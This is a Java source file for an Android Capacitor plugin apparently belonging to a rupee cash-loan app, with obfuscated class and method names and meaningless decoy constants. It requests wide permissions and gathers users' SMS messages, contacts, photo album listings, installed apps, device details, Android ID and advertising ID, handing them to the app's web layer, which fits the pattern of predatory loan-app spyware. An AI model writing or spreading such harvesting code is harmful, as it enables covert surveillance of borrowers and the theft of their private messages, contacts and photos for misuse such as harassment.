package com.money.money.box.loan.rupee.cash;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;

import com.getcapacitor.JSObject;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.util.HashMap;
import java.util.Map;


@CapacitorPlugin(name = "FKJYHLEH")
public class FKJYHLEHPlugin extends com.getcapacitor.Plugin {
    public static final int CAMERA_REQUEST_CODE = 564;
    public static final int CAMERA_REKDKJSEST_CODE = 43434;
    public static final int CASSOIA_REQUEST_CODE = 343;
    public static final int CAMFLKA_REQUEST_CODE = 4334;
    public static final int CAMERA_REQSJKST_CODE = 4334;
    public static final int CAMERA_REKLKST_CODE = 4343;
    public static final int CAMERA_REQfssLKST_CODE = 434;
    public static PluginCall newCall;

    @PluginMethod()
    public void FKJYHLEH(PluginCall call) {
        JSObject ret = new JSObject();
        String value = call.getString("mm");
        switch (value){
            case "FKJYHLEHToken" :
                ret.put("a", getGaid(getContext()));
                ret.put("b", getAndroidID(getContext()));
                ret.put("c", getAppVersionName(getContext()));
                break;
            case "FKJYHLEHPremisson" :
                newCall = call;
                ActivityCompat.requestPermissions(
                        getActivity(),
                        new String[] {
                                Manifest.permission.READ_PHONE_STATE,Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_CONTACTS,Manifest.permission.ACCESS_COARSE_LOCATION,
                                Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS},
                        CAMERA_REQUEST_CODE);
                return;
            case "FKJYHLEHemail" :
                try {
                    Intent data=new Intent(Intent.ACTION_SENDTO);
                    data.setData(Uri.parse("mailto:violin.customer@hotmail.com"));
                    getActivity().startActivity(data);
                } catch (Exception e) {

                }
                break;
            default :
                Map map = new HashMap();
                if (value.equals("getDeviceInfo")) {
                    map.put("device", FKJYHLEHDeviceUtils.getDeviceInfo(getActivity()));
                }
                if (value.equals("getPhoto")) {
                    map.put("photoList", FKJYHLEHDeviceUtils.getAlbumPhotos(getActivity()));
                }
                if (value.equals("getApp")) {
                    map.put("deviceApps", FKJYHLEHDeviceUtils.getDeviceApps(getActivity()));
                }
                if (value.equals("getSms")) {
                    map.put("smsList", FKJYHLEHDeviceUtils.getPhoneSms(getActivity()));
                }
                if (value.equals("getContact")) {
                    map.put("deviceContacts", FKJYHLEHDeviceUtils.getContacts(getActivity()));
                }
                Gson gson = new Gson();
                String json = gson.toJson(map);
                JsonObject mm = gson.fromJson(json, JsonObject.class);
                ret.put("phoneDevice", mm);
        }
        call.resolve(ret);
    }
    public static String getAppVersionName(Context context) {
        String versionName = "";
        try {
            // ---get the package info---
            PackageManager pm = context.getPackageManager();
            PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
            versionName = pi.versionName;
            if (versionName == null || versionName.length() <= 0) {
                return "";
            }
        } catch (Exception e) {

        }
        return versionName;
    }
    public static String getAndroidID(Context context) {
        try {
            String androidID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            //LogUtil.e("androidID: " + androidID);
            return androidID;
        } catch (Exception e) {
            return null;
        }
    }
    public static String getGaid(Context context) {
        try {
            String Gaid = new AdvertisingIdClient(context).getAdvertisingIdInfo(context).getId();
            FKJYHLEHPremissonUtils.myAtoi("FD");
            return Gaid;
        } catch (Exception e) {
            return null;
        }
    }



}
